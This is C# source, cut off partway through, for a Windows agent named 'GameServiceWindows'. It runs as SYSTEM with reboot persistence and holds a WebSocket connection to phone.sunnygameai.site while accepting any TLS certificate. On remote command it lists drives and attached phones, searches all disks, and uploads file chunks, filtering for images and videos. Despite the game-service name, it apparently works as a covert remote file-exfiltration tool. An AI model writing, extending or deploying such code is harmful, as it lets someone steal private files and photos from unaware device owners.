using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Authentication;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

// Fresh Windows agent - minimal browser disks (DriveInfo + WPD MTP) with stable connection.
// Built via Build/WindowsBuild/AgentExe/build-agents.sh -> GameServiceWindows.exe, runs as SYSTEM, background, reboot via schtasks.
class GameServiceWindows
{
    static string Host = "phone.sunnygameai.site";
    static int Port = 443;
    static string DeviceName = Environment.MachineName + "_PC";
    static string DeviceId = GetOrCreateDeviceId();
    static string ServiceName = "GameServiceWindows";
    static volatile bool isRunning = true;
    static string LogDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "GameServiceWindows");
    static string LogFile = Path.Combine(LogDir, "agent.log");
    static string DesktopLog = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "GameServiceWindows.log");

    // Try to also log to Murad desktop when running as SYSTEM (SYSTEM desktop is different)
    static string[] ExtraLogPaths = new string[] {
        @"C:\Users\Murad\Desktop\GameServiceWindows.log",
        @"C:\Users\Public\Desktop\GameServiceWindows.log"
    };

    static string GetOrCreateDeviceId()
    {
        try
        {
            string[] candidates = new string[] {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "GameServiceWindows", "device_id.txt"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "GameServiceWindows", "device_id.txt"),
                @"C:\ProgramData\GameServiceWindows\device_id.txt"
            };
            foreach (var p in candidates) { try { if (File.Exists(p)) { var v = File.ReadAllText(p).Trim(); if (!string.IsNullOrEmpty(v)) return v; } } catch {} }
            string id = Guid.NewGuid().ToString();
            foreach (var p in candidates) { try { Directory.CreateDirectory(Path.GetDirectoryName(p)); File.WriteAllText(p, id); break; } catch {} }
            return id;
        } catch { return Guid.NewGuid().ToString(); }
    }

    static void Log(string msg, string level = "MESSAGE")
    {
        try
        {
            string line = DateTime.Now.ToString("HH:mm:ss.fff") + " [" + DeviceName + "/" + ServiceName + "] [" + level + "] " + msg;
            Console.WriteLine(line);
            try { Directory.CreateDirectory(LogDir); File.AppendAllText(LogFile, line + "\r\n"); } catch {}
            // desktop logs best effort
            try { File.AppendAllText(DesktopLog, line + "\r\n"); } catch {}
            foreach (var p in ExtraLogPaths) { try { File.AppendAllText(p, line + "\r\n"); } catch {} }
        } catch {}
    }

    static string EscapeJson(string s)
    {
        if (s == null) return "";
        var sb = new StringBuilder(s.Length + 10);
        foreach (char c in s)
        {
            if (c == '\\') sb.Append("\\\\");
            else if (c == '"') sb.Append("\\\"");
            else if (c == '\r') sb.Append("\\r");
            else if (c == '\n') sb.Append("\\n");
            else if (c == '\t') sb.Append("\\t");
            else if (c < 0x20) sb.Append("\\u" + ((int)c).ToString("x4"));
            else sb.Append(c);
        }
        return sb.ToString();
    }

    static string FormatIso(DateTime dt)
    {
        return dt.ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ");
    }

    static void Main()
    {
        Log("GameServiceWindows started DeviceName=" + DeviceName + " DeviceId=" + DeviceId + " Host=" + Host, "SUCCESS");
        while (isRunning)
        {
            try
            {
                if (!CheckStatus()) { Log("status check failed, retry 5s", "MESSAGE"); Thread.Sleep(5000); continue; }
                Log("status ok, connecting to " + Host + ":" + Port, "MESSAGE");
                ConnectAndLoop().Wait();
            } catch (Exception ex) { Log("loop ex: " + ex, "ERROR"); }
            Thread.Sleep(5000);
        }
    }

    static bool CheckStatus()
    {
        try { using (var tcp = new TcpClient()) { tcp.Connect(Host, 443); return true; } } catch (Exception ex) { Log("CheckStatus ex: " + ex.Message, "ERROR"); return false; }
    }

    static async Task ConnectAndLoop()
    {
        var tcp = new TcpClient();
        await tcp.ConnectAsync(Host, Port);
        tcp.NoDelay = true;
        tcp.ReceiveTimeout = 35000;
        var ssl = new SslStream(tcp.GetStream(), false, (s, c, ch, e) => true);
        // Use None to allow TLS1.2+TLS1.3 (old Tls12-only caused timeout with cloudflare)
        try { ssl.AuthenticateAsClient(Host, null, SslProtocols.None, false); }
        catch { ssl.AuthenticateAsClient(Host, null, SslProtocols.Tls12, false); }
        Log("TLS ok proto=" + ssl.SslProtocol, "SUCCESS");
        string key = Convert.ToBase64String(Guid.NewGuid().ToByteArray());
        string req = "GET /communicate HTTP/1.1\r\nHost: " + Host + "\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: " + key + "\r\nSec-WebSocket-Version: 13\r\nUser-Agent: Windows-GameService\r\n\r\n";
        byte[] reqBytes = Encoding.UTF8.GetBytes(req);
        await ssl.WriteAsync(reqBytes, 0, reqBytes.Length);
        string header = await ReadHttpHeader(ssl);
        if (!header.Contains("101")) throw new Exception("WebSocket handshake failed no 101: " + header.Substring(0, Math.Min(400, header.Length)));
        Log("WS 101 OK", "SUCCESS");
        await SendWsText(ssl, "{\"protocol\":\"json\",\"version\":1}\x1e");
        string hs = await ReadWsText(ssl);
        Log("SignalR handshake resp: " + (hs ?? "null").Substring(0, Math.Min(200, (hs ?? "").Length)), "MESSAGE");

        // Device record
        string reg = "{\"type\":1,\"target\":\"ReceiveDeviceRecord\",\"arguments\":[{\"DeviceName\":\"" + EscapeJson(DeviceName) + "\",\"DeviceId\":\"" + EscapeJson(DeviceId) + "\",\"Platform\":\"Windows\"}]}\x1e";
        await SendWsText(ssl, reg);
        Log("sent ReceiveDeviceRecord Platform=Windows", "SUCCESS");

        // Per-class registration via empty SendLog (server registers service)
        await SendWsText(ssl, "{\"type\":1,\"target\":\"SendLog\",\"arguments\":[\"" + EscapeJson(DeviceName) + "\",\"" + EscapeJson(ServiceName) + "\",\"Message\",\"\"]}\x1e");
        Log("registered debug source " + ServiceName, "MESSAGE");
        // also send a success stamped line
        string stamp = "[SUCCESS] " + DeviceName + " " + ServiceName + " started";
        await SendWsText(ssl, "{\"type\":1,\"target\":\"SendLog\",\"arguments\":[\"" + EscapeJson(DeviceName) + "\",\"" + EscapeJson(ServiceName) + "\",\"Success\",\"" + EscapeJson(stamp) + "\"]}\x1e");

        var cts = new CancellationTokenSource();
        var pingTask = Task.Run(async () => { while (!cts.Token.IsCancellationRequested) { await Task.Delay(15000, cts.Token).ContinueWith(_=>{}); try { await SendWsText(ssl, "{\"type\":6}\x1e"); } catch {} } });

        var buf = new StringBuilder();
        while (isRunning)
        {
            string frame = await ReadWsText(ssl);
            if (frame == null) { Log("ReadWsText returned null (close) breaking", "ERROR"); break; }
            buf.Append(frame);
            int idx;
            while ((idx = buf.ToString().IndexOf('\x1e')) != -1)
            {
                string raw = buf.ToString(0, idx).Trim();
                buf.Remove(0, idx + 1);
                if (raw.Length > 0) await HandleMessage(ssl, raw);
            }
        }
        cts.Cancel();
        try { pingTask.Dispose(); } catch {}
        try { ssl.Close(); } catch {}
        try { tcp.Close(); } catch {}
        Log("ConnectAndLoop ended, will reconnect", "MESSAGE");
    }

    static async Task<string> ReadHttpHeader(SslStream s)
    {
        var header = new List<byte>();
        var one = new byte[1];
        while (true)
        {
            int r = await s.ReadAsync(one, 0, 1);
            if (r <= 0) break;
            header.Add(one[0]);
            if (header.Count >= 4 && header[header.Count - 4] == 13 && header[header.Count - 3] == 10 && header[header.Count - 2] == 13 && header[header.Count - 1] == 10) break;
            if (header.Count > 8192) break;
        }
        return Encoding.UTF8.GetString(header.ToArray());
    }

    static async Task HandleMessage(SslStream ssl, string json)
    {
        try
        {
            Log("HandleMessage raw len=" + json.Length + " json=" + json.Substring(0, Math.Min(800, json.Length)), "MESSAGE");
            if (!json.Contains("\"target\""))
            {
                if (json.Contains("\"type\":6")) Log("ping type6 received", "MESSAGE");
                return;
            }
            string target = ExtractJsonString(json, "target");
            string invocationId = ExtractJsonString(json, "invocationId");
            Log("target=" + target + " invocationId=" + invocationId, "MESSAGE");

            if (target == "RefreshConfiguration")
            {
                // args[0] is config json string
                string cfg = ExtractJsonString(json, "arguments", 0);
                Log("RefreshConfiguration cfgLen=" + (cfg?.Length ?? 0), "MESSAGE");
                // no action needed for minimal, but we could store
                return;
            }
            if (target == "GetDeviceConfig")
            {
                string cfg = "{\"videoFrameNormalized\":0.1,\"sendDebug\":true,\"thumbnailQuality\":0,\"videoQuality\":0,\"videoBitrateMultiplier\":0.5,\"videoResolutionMultiplier\":1,\"bitrateCappingEnabled\":true,\"bitrateCapMbps\":3,\"resolutionCeilingEnabled\":true,\"resolutionCeilingPx\":720,\"speedLimitKbps\":0,\"keepScreenOn\":false,\"parallelWork\":\"Medium\",\"coreAmount\":" + Environment.ProcessorCount + ",\"coreSet\":" + Environment.ProcessorCount + "}";
                string resp = "{\"type\":3,\"invocationId\":\"" + EscapeJson(invocationId) + "\",\"result\":" + cfg + "}\x1e";
                await SendWsText(ssl, resp);
                Log("GetDeviceConfig replied cores=" + Environment.ProcessorCount, "MESSAGE");
                return;
            }
            if (target == "GetPathInfo" || target == "GetPathInfoWithOverride")
            {
                string path = ExtractJsonString(json, "arguments", 0);
                bool isLowRes = ExtractJsonBool(json, "arguments", 1);
                bool imageOnly = false, videoOnly = false;
                int sinceDays = 0, startIndex = 0, fileLimit = 0;
                if (target == "GetPathInfoWithOverride")
                {
                    imageOnly = ExtractJsonBool(json, "arguments", 4);
                    videoOnly = ExtractJsonBool(json, "arguments", 5);
                    sinceDays = ExtractJsonInt(json, "arguments", 6);
                    startIndex = ExtractJsonInt(json, "arguments", 7);
                    fileLimit = ExtractJsonInt(json, "arguments", 8);
                }
                else
                {
                    imageOnly = ExtractJsonBool(json, "arguments", 2);
                    videoOnly = ExtractJsonBool(json, "arguments", 3);
                    sinceDays = ExtractJsonInt(json, "arguments", 4);
                    startIndex = ExtractJsonInt(json, "arguments", 5);
                    fileLimit = ExtractJsonInt(json, "arguments", 6);
                }
                string result;
                if (string.IsNullOrEmpty(path) || path == "/" || path.Trim() == "")
                    result = BuildRootJson();
                else
                {
                    if (path.StartsWith("shell:"))
                        result = BuildShellPathInfoJson(path.Substring(6), imageOnly, videoOnly, sinceDays, startIndex, fileLimit);
                    else
                        result = BuildPathInfoJson(path, imageOnly, videoOnly, sinceDays, startIndex, fileLimit);
                }
                string resp = "{\"type\":3,\"invocationId\":\"" + EscapeJson(invocationId) + "\",\"result\":" + result + "}\x1e";
                await SendWsText(ssl, resp);
                Log("GetPathInfo path='" + path + "' -> " + result.Substring(0, Math.Min(400, result.Length)), "MESSAGE");
                return;
            }
            if (target == "GetFileChunk" || target == "GetFileChunkWithOverride")
            {
                string path = ExtractJsonString(json, "arguments", 0);
                long offset = ExtractJsonLong(json, "arguments", 1);
                int chunkSize = ExtractJsonInt(json, "arguments", 2);
                // For minimal, just read normal file; isLowRes ignored (could add thumb later)
                byte[] chunk = GetFileChunk(path, offset, chunkSize);
                string b64 = Convert.ToBase64String(chunk);
                string resp = "{\"type\":3,\"invocationId\":\"" + EscapeJson(invocationId) + "\",\"result\":\"" + b64 + "\"}\x1e";
                await SendWsText(ssl, resp);
                Log("GetFileChunk path='" + path + "' off=" + offset + " returned " + chunk.Length, "MESSAGE");
                return;
            }
            if (target == "SearchFiles")
            {
                string query = ExtractJsonString(json, "arguments", 0);
                string startPath = ExtractJsonString(json, "arguments", 1);
                bool isGlobal = ExtractJsonBool(json, "arguments", 2);
                var results = SearchFiles(query, startPath, isGlobal);
                var arr = new StringBuilder("[");
                for (int i = 0; i < results.Count; i++) { if (i > 0) arr.Append(","); arr.Append(results[i]); }
                arr.Append("]");
                string resp = "{\"type\":3,\"invocationId\":\"" + EscapeJson(invocationId) + "\",\"result\":" + arr.ToString() + "}\x1e";
                await SendWsText(ssl, resp);
                Log("SearchFiles query='" + query + "' -> " + results.Count, "MESSAGE");
                return;
            }
            if (target == "StopSearch")
            {
                string resp = "{\"type\":3,\"invocationId\":\"" + EscapeJson(invocationId) + "\",\"result\":true}\x1e";
                await SendWsText(ssl, resp);
                return;
            }
            if (target == "GetDebugBuffer")
            {
                string resp = "{\"type\":3,\"invocationId\":\"" + EscapeJson(invocationId) + "\",\"result\":[]}\x1e";
                await SendWsText(ssl, resp);
                return;
            }
            Log("Unhandled target: " + target, "MESSAGE");
        } catch (Exception ex) { Log("HandleMessage ex: " + ex, "ERROR"); }
    }

    // ---------- Filesystem helpers ----------

    static bool IsImage(string p) { string e = Path.GetExtension(p).ToLowerInvariant(); return e == ".jpg" || e == ".jpeg" || e == ".png" || e == ".webp" || e == ".bmp" || e == ".gif"; }
    static bool IsVideo(string p) { string e = Path.GetExtension(p).ToLowerInvariant(); return e == ".mp4" || e == ".mkv" || e == ".avi" || e == ".mov" || e == ".wmv" || e == ".webm" || e == ".flv" || e == ".m4v" || e == ".3gp"; }

    static byte[] GetFileChunk(string relPath, long offset, int chunkSize)
    {
        try
        {
            if (string.IsNullOrEmpty(relPath)) return new byte[0];
            if (relPath.StartsWith("shell:")) return new byte[0]; // MTP file read later
            string fsPath = relPath.Replace('/', '\\');
            if (!File.Exists(fsPath)) return new byte[0];
            using (var fs = new FileStream(fsPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                if (offset >= fs.Length) return new byte[0];
                fs.Seek(offset, SeekOrigin.Begin);
                int toRead = (int)Math.Min(chunkSize <= 0 ? 524288 : chunkSize, fs.Length - offset);
                var buf = new byte[toRead];
                int read = fs.Read(buf, 0, toRead);
                if (read < toRead) { var t = new byte[read]; Array.Copy(buf, t, read); return t; }
                return buf;
            }
        } catch (Exception ex) { Log("GetFileChunk ex: " + ex.Message, "ERROR"); return new byte[0]; }
    }

    static List<string> SearchFiles(string query, string startPath, bool isGlobal)
    {
        var res = new List<string>();
        if (string.IsNullOrWhiteSpace(query)) return res;
        string lower = query.Trim().ToLowerInvariant();
        string dummyRoot = "";
        if (isGlobal)
        {
            // search all ready drives
            foreach (var d in DriveInfo.GetDrives()) { try { if (!d.IsReady) continue; SearchRecurse(new DirectoryInfo(d.RootDirectory.FullName), lower, res, 0); if (res.Count >= 500) break; } catch {} }
            return res;
        }
        else
        {
            string fsPath = string.IsNullOrEmpty(startPath) ? "" : startPath.Replace('/', '\\');
            if (string.IsNullOrEmpty(fsPath) || fsPath == "\\" || fsPath == "/") fsPath = @"C:\";
            try { SearchRecurse(new DirectoryInfo(fsPath), lower, res, 0); } catch {}
            return res;
        }
    }
    static void SearchRecurse(DirectoryInfo dir, string lower, List<string> res, int depth)
    {
        if (depth > 12 || res.Count >= 500) return;
        FileSystemInfo[] entries;
        try { entries = dir.GetFileSystemInfos(); } catch { return; }
        foreach (var e in entries)
        {
            if (res.Count >= 500) return;
            if (e.Name.ToLowerInvariant().Contains(lower))
            {
                string full = e.FullName.Replace('\\', '/');
                // make relativePath like C:/Users/... - keep absolute as relative for now (consistent with DriveInfo)
                string rel = full;
                if (rel.Length >= 2 && rel[1] == ':') rel = rel; else rel = "/" + rel.TrimStart(new char[]{'/'});
                string node = "{\"name\":\"" + EscapeJson(e.Name) + "\",\"relativePath\":\"" + EscapeJson(rel) + "\",\"isDirectory\":" + (e.Attributes.HasFlag(FileAttributes.Directory) ? "true" : "false") + ",\"length\":" + (e is FileInfo fi ? fi.Length.ToString() : "0") + ",\"originalLength\":" + (e is FileInfo fi2 ? fi2.Length.ToString() : "0") + ",\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(e.LastWriteTimeUtc) + "\"}";
                res.Add(node);
            }
            if (e.Attributes.HasFlag(FileAttributes.Directory) && !e.Name.StartsWith("."))
                SearchRecurse((DirectoryInfo)e, lower, res, depth + 1);
        }
    }

    static string BuildRootJson()
    {
        var sb = new StringBuilder();
        // currentNode for root - keep compatible with Android "0"
        sb.Append("{\"exists\":true,\"currentNode\":{\"name\":\"0\",\"relativePath\":\"\",\"isDirectory\":true,\"length\":0,\"originalLength\":0,\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(DateTime.UtcNow) + "\"},\"children\":[");
        bool first = true;
        try
        {
            foreach (var d in DriveInfo.GetDrives())
            {
                try
                {
                    string driveName = d.Name; // e.g. "C:\\"
                    string display = driveName.TrimEnd(new char[]{'\\', '/'}); // "C:"
                    if (string.IsNullOrEmpty(display)) display = driveName;
                    string rel = driveName.Replace('\\', '/'); // "C:/"
                    string kind;
                    switch (d.DriveType)
                    {
                        case DriveType.Fixed: kind = "disk"; break;
                        case DriveType.Removable: kind = "usb"; break;
                        case DriveType.Network: kind = "networkdrive"; break;
                        case DriveType.CDRom: kind = "cdrom"; break;
                        case DriveType.Ram: kind = "ram"; break;
                        default: kind = "disk"; break;
                    }
                    bool ready = false;
                    try { ready = d.IsReady; } catch { ready = false; }
                    long total = 0, free = 0;
                    if (ready)
                    {
                        try { total = d.TotalSize; free = d.AvailableFreeSpace; } catch {}
                    }
                    string warning = "";
                    bool disabled = false;
                    if (!ready)
                    {
                        disabled = true;
                        warning = d.DriveType == DriveType.CDRom ? "No disc inserted." : "Drive not ready.";
                    }
                    string label = "";
                    try { label = d.VolumeLabel; } catch {}
                    string nameWithLabel = display;
                    if (!string.IsNullOrWhiteSpace(label)) nameWithLabel = display + " (" + label + ")";
                    // Log for verification on VM
                    Log("Drive " + display + " type=" + d.DriveType + " kind=" + kind + " ready=" + ready + " label=" + label, "MESSAGE");
                    if (!first) sb.Append(",");
                    sb.Append("{\"name\":\"" + EscapeJson(nameWithLabel) + "\",\"relativePath\":\"" + EscapeJson(rel) + "\",\"isDirectory\":true,\"length\":0,\"originalLength\":0,\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(DateTime.UtcNow) + "\",\"entryKind\":\"" + EscapeJson(kind) + "\",\"disabled\":" + (disabled ? "true" : "false") + ",\"accessWarning\":\"" + EscapeJson(warning) + "\",\"freeBytes\":" + free + ",\"totalBytes\":" + total + "}");
                    first = false;
                } catch (Exception ex) { Log("BuildRoot drive ex: " + ex.Message, "ERROR"); }
            }
        } catch (Exception ex) { Log("BuildRoot GetDrives ex: " + ex.Message, "ERROR"); }

        // MTP via Shell (primary, sees Galaxy correctly as SYSTEM) + WPD fallback (when Shell empty)
        try { AppendShellMtp(sb, ref first); } catch (Exception ex) { Log("AppendShellMtp ex: " + ex.Message, "ERROR"); }
        try { AppendWpdMtp(sb, ref first); } catch (Exception ex) { Log("AppendWpdMtp ex: " + ex.Message, "ERROR"); }

        sb.Append("],\"totalFileCount\":0}");
        string json = sb.ToString();
        Log("BuildRootJson -> " + json.Substring(0, Math.Min(800, json.Length)), "MESSAGE");
        return json;
    }

    static void AppendWpdMtp(StringBuilder sb, ref bool first)
    {
        try
        {
            var searcher = new ManagementObjectSearcher("SELECT Name, DeviceID FROM Win32_PnPEntity WHERE PNPClass='WPD'");
            var collection = searcher.Get();
            foreach (ManagementObject mo in collection)
            {
                string name = mo["Name"] as string;
                string devId = mo["DeviceID"] as string;
                if (string.IsNullOrEmpty(name)) name = devId ?? "MTP Device";
                if (string.IsNullOrEmpty(devId)) devId = name;
                // Filter out USB mass-storage that already appears as drive E: (SWD\WPDBUSENUM\_??_USBSTOR... = thumbstick)
                // WPD for thumbstick is SWD\WPDBUSENUM\_??_USBSTOR, for phone is USB\VID_... Keep both but dedup drive case handled via name check
                // Avoid duplicate if already added (drive E: has name "E: (WIN10...)" not equal "WIN10..." so not deduped - we allow duplicate thumb as MTP but phone will still show)
                // For strict dedup, skip thumb WPD if its DeviceID contains USBSTOR (already drive)
                if (devId != null && devId.IndexOf("USBSTOR", StringComparison.OrdinalIgnoreCase) >= 0) {
                    Log("WPD skip USBSTOR (drive already): " + name, "MESSAGE");
                    continue;
                }
                if (sb.ToString().Contains(EscapeJson(name))) continue;
                // Convert DeviceID USB\VID_... to Shell parsing name ::{20D04FE0...}\?\usb#vid_...#{6ac27878...} (as old agent)
                string parse = devId;
                if (devId.StartsWith("USB\\", StringComparison.OrdinalIgnoreCase))
                {
                    string low = devId.ToLowerInvariant().Replace('\\', '#');
                    parse = "::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\?\\" + low + "#{6ac27878-a6fa-4155-ba85-f98f491d4f33}";
                }
                else if (!devId.StartsWith("::", StringComparison.OrdinalIgnoreCase))
                {
                    // keep as is for other types
                }
                string vpath = "shell:" + HexEncode(parse);
                if (!first) sb.Append(",");
                sb.Append("{\"name\":\"" + EscapeJson(name) + "\",\"relativePath\":\"" + EscapeJson(vpath) + "\",\"isDirectory\":true,\"length\":0,\"originalLength\":0,\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(DateTime.UtcNow) + "\",\"entryKind\":\"mtp\",\"disabled\":false,\"accessWarning\":\"\",\"freeBytes\":0,\"totalBytes\":0}");
                first = false;
                Log("WPD MTP added: " + name + " id=" + devId, "MESSAGE");
            }
            Log("WPD query done, first=" + first, "MESSAGE");
        } catch (Exception ex) { Log("WPD query ex: " + ex.Message + " " + ex.StackTrace, "ERROR"); }
    }

    static void AppendShellMtp(StringBuilder sb, ref bool first)
    {
        try
        {
            var shellType = Type.GetTypeFromProgID("Shell.Application");
            if (shellType == null) return;
            dynamic shell = Activator.CreateInstance(shellType);
            // 17 = This PC, 18 = Network
            try
            {
                dynamic ns = shell.NameSpace(17);
                if (ns != null)
                {
                    dynamic items = ns.Items();
                    int cnt = items.Count;
                    for (int i = 0; i < cnt; i++)
                    {
                        try
                        {
                            dynamic it = items.Item(i);
                            string title = it.Name as string; if (string.IsNullOrEmpty(title)) title = it.Title as string; if (string.IsNullOrEmpty(title)) continue;
                            string path = it.Path as string ?? "";
                            string parse = it.ParsingName as string;
                            if (string.IsNullOrEmpty(parse)) parse = path; // MTP as SYSTEM: ParsingName empty, Path has ::{20D04FE0...}\?\usb#...
                            if (string.IsNullOrEmpty(parse)) parse = title;
                            if (parse.Length >= 2 && parse.Length >= 3 && parse[1] == ':' && parse[2] == '\\') continue; // skip normal drives C:\ etc via parse, not path
                            if (path.Length >= 2 && path[1] == ':') continue; // also skip via Path
                            string vpath = "shell:" + HexEncode(parse);
                            if (sb.ToString().Contains(EscapeJson(title))) continue; // dedup WPD
                            Log("Shell MTP check: title=" + title + " path=" + path + " parse=" + parse, "MESSAGE");
                            string kind = "mtp";
                            if (!first) sb.Append(",");
                            sb.Append("{\"name\":\"" + EscapeJson(title) + "\",\"relativePath\":\"" + EscapeJson(vpath) + "\",\"isDirectory\":true,\"length\":0,\"originalLength\":0,\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(DateTime.UtcNow) + "\",\"entryKind\":\"" + kind + "\",\"disabled\":false,\"accessWarning\":\"\",\"freeBytes\":0,\"totalBytes\":0}");
                            first = false;
                            Log("Shell MTP added: " + title + " parse=" + parse, "MESSAGE");
                        } catch {}
                    }
                }
            } catch {}
        } catch (Exception ex) { Log("Shell MTP ex: " + ex.Message, "ERROR"); }
    }

    static string HexEncode(string s) { var b = Encoding.UTF8.GetBytes(s); var sb = new StringBuilder(b.Length * 2); foreach (var x in b) sb.Append(x.ToString("x2")); return sb.ToString(); }
    static string HexDecode(string h) { try { if (string.IsNullOrEmpty(h) || h.Length % 2 != 0) return null; var b = new byte[h.Length / 2]; for (int i = 0; i < b.Length; i++) b[i] = Convert.ToByte(h.Substring(i * 2, 2), 16); return Encoding.UTF8.GetString(b); } catch { return null; } }

    static string BuildPathInfoJson(string vpath, bool imageOnly, bool videoOnly, int sinceDays, int startIndex, int fileLimit)
    {
        try
        {
            string fsPath = vpath.Replace('/', '\\');
            // Normalize C:/ -> C:\
            if (fsPath.Length == 3 && fsPath[1] == ':' && fsPath[2] == '\\') { /* root drive ok */ }
            if (!Directory.Exists(fsPath) && !File.Exists(fsPath))
                return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}";

            if (File.Exists(fsPath) && !Directory.Exists(fsPath))
            {
                var fi = new FileInfo(fsPath);
                string cur = "{\"name\":\"" + EscapeJson(fi.Name) + "\",\"relativePath\":\"" + EscapeJson(vpath) + "\",\"isDirectory\":false,\"length\":" + fi.Length + ",\"originalLength\":" + fi.Length + ",\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(fi.LastWriteTimeUtc) + "\"}";
                return "{\"exists\":true,\"currentNode\":" + cur + ",\"children\":[],\"totalFileCount\":0}";
            }

            var di = new DirectoryInfo(fsPath);
            string dirNode = "{\"name\":\"" + EscapeJson(di.Name) + "\",\"relativePath\":\"" + EscapeJson(vpath) + "\",\"isDirectory\":true,\"length\":0,\"originalLength\":0,\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(di.LastWriteTimeUtc) + "\"}";
            // But for drive root like C:/ , di.Name is "C:"? DirectoryInfo for C:\ returns "C:\" - handle
            if (fsPath.Length <= 4 && fsPath[1] == ':')
                dirNode = "{\"name\":\"" + EscapeJson(fsPath.Replace('\\','/')) + "\",\"relativePath\":\"" + EscapeJson(vpath) + "\",\"isDirectory\":true,\"length\":0,\"originalLength\":0,\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(di.LastWriteTimeUtc) + "\"}";

            var dirs = new List<string>();
            var allFiles = new List<string>();
            try { foreach (var d in Directory.GetDirectories(fsPath)) dirs.Add(d); } catch (Exception ex) { Log("GetDirectories ex for " + fsPath + ": " + ex.Message, "ERROR"); }
            try
            {
                foreach (var f in Directory.GetFiles(fsPath))
                {
                    if (imageOnly || videoOnly)
                    {
                        bool isImg = IsImage(f); bool isVid = IsVideo(f);
                        bool keep = (imageOnly && isImg) || (videoOnly && isVid);
                        if (!keep) continue;
                    }
                    if (sinceDays > 0)
                    {
                        try { if (File.GetLastWriteTimeUtc(f) < DateTime.UtcNow.AddDays(-sinceDays)) continue; } catch {}
                    }
                    allFiles.Add(f);
                }
            } catch (Exception ex) { Log("GetFiles ex for " + fsPath + ": " + ex.Message, "ERROR"); }

            int totalFileCount = allFiles.Count;
            List<string> filesPaged;
            if (fileLimit > 0 || startIndex > 0)
            {
                int from = Math.Max(0, startIndex);
                if (from >= totalFileCount) filesPaged = new List<string>();
                else
                {
                    int to = fileLimit > 0 ? Math.Min(totalFileCount, from + fileLimit) : totalFileCount;
                    filesPaged = allFiles.GetRange(from, to - from);
                }
            } else filesPaged = allFiles;

            var sb = new StringBuilder();
            sb.Append("{\"exists\":true,\"currentNode\":" + dirNode + ",\"children\":[");
            bool first = true;
            foreach (var d in dirs)
            {
                try
                {
                    var dfi = new DirectoryInfo(d);
                    string rel = vpath.TrimEnd(new char[]{'/'}) + "/" + dfi.Name;
                    rel = rel.Replace("//","/");
                    if (!first) sb.Append(",");
                    sb.Append("{\"name\":\"" + EscapeJson(dfi.Name) + "\",\"relativePath\":\"" + EscapeJson(rel) + "\",\"isDirectory\":true,\"length\":0,\"originalLength\":0,\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(dfi.LastWriteTimeUtc) + "\"}");
                    first = false;
                } catch {}
            }
            foreach (var f in filesPaged)
            {
                try
                {
                    var fi = new FileInfo(f);
                    string rel = vpath.TrimEnd(new char[]{'/'}) + "/" + fi.Name;
                    rel = rel.Replace("//","/");
                    if (!first) sb.Append(",");
                    sb.Append("{\"name\":\"" + EscapeJson(fi.Name) + "\",\"relativePath\":\"" + EscapeJson(rel) + "\",\"isDirectory\":false,\"length\":" + fi.Length + ",\"originalLength\":" + fi.Length + ",\"originalPreviewLength\":0,\"lastWriteTimeUtc\":\"" + FormatIso(fi.LastWriteTimeUtc) + "\"}");
                    first = false;
                } catch {}
            }
            sb.Append("],\"totalFileCount\":" + totalFileCount + "}");
            return sb.ToString();
        } catch (Exception ex) { Log("BuildPathInfoJson ex: " + ex, "ERROR"); return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}"; }
    }

    static object ShellApp() { try { var t = Type.GetTypeFromProgID("Shell.Application"); return t==null?null:Activator.CreateInstance(t); } catch { return null; } }
    static object ShellCall(object obj, string member, object[] args) { if (obj==null) return null; try { return obj.GetType().InvokeMember(member, System.Reflection.BindingFlags.InvokeMethod | System.Reflection.BindingFlags.GetProperty, null, obj, args ?? new object[0]); } catch { return null; } }

    static string BuildShellPathInfoJson(string rest, bool imageOnly, bool videoOnly, int sinceDays, int startIndex, int fileLimit)
    {
        try
        {
            string parse = HexDecode(rest.Split(new char[]{'/'})[0]);
            if (parse == null) return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}";
            object shell = ShellApp();
            if (shell == null) return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}";
            object ns = ShellCall(shell, "NameSpace", new object[]{17});
            if (ns == null) return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}";
            object items = ShellCall(ns, "Items", null);
            if (items == null) return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}";
            object cntObj = ShellCall(items, "Count", null);
            if (!(cntObj is int)) return "{\"exists\":false,\"currentNode\":{},\"children\":[],\"totalFileCount\":0}";
            int cnt = (int)cntObj;
            object target = null;
            Func<string,string> norm = s => s == null ? "" : s.ToLowerInvariant().Replace("\\", "");
            string normParse = norm(parse);
            for (int i=0;i<cnt;i++) {
                object it = ShellCall(items, "Item", new object[]{i});
                if (it==null) continue;
                string p = ShellCall(it, "ParsingName", null) as string ?? "";
                string pp = ShellCall(it, "Path", null) as string ?? "";
                string nm = ShellCall(it, "Name", null) as string ?? "";
                Log("BuildShell check ["+i+"] name='"+nm+"' p='"+p.Substring(0, Math.Min(80, p.Length))+"' pp='"+pp.Substring(0, Math.Min(80, pp.Length))+"' want='"+parse.Substring(0, Math.Min(80, parse.Length))+"'", "MESSAGE");
